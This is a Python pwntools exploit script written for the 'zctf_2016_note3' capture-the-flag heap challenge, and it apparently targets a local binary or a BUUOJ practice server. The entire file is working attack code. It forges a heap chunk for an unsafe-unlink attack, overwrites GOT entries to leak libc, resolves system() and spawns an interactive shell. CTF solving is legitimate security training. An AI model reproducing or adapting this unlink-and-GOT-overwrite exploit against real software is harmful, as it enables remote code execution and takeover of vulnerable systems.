#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/11 08:21:54
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('zctf_2016_note3')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 26794
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('zctf_2016_note3')

def cmd(choice):
    sh.recvuntil("option--->>\n")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Input the length of the note content:(less than 1024)\n")
    sh.sendline(str(size))
    sh.recvuntil("Input the note content:")
    sh.sendline(content)

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Input the new content:\n")
    sh.sendline(content)

def dele(idx):
    cmd(4)
    sh.recvuntil("Input the id of the note:\n")
    sh.sendline(str(idx))
ptr = 0x6020C8
payload = p64(0) + p64(0x1) + p64(ptr-0x18) + p64(ptr-0x10)
add(0x80,payload) #0
add(0,"bbbb") #1
add(0x80,"dddd") #2
add(0x20,"eeee") #3
dele(1)
payload = '\x00' * 0x10 

payload += p64(0xa0) + p64(0x90)
add(0,payload)

dele(2)
payload = p64(0) * 3 + p64(ptr) + p64(elf.got['free']) + p64(elf.got['atoi']) + p64(elf.got['atoi'])
edit(0,payload)
# gdb.attach(sh)
# pause()
edit(1,p64(elf.plt['puts']))
gdb.attach(sh)
pause()
dele(2)
atoi_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = LibcSearcher('atoi',atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')
edit(3,p64(system_addr))
cmd("/bin/sh\x00")
sh.interactive()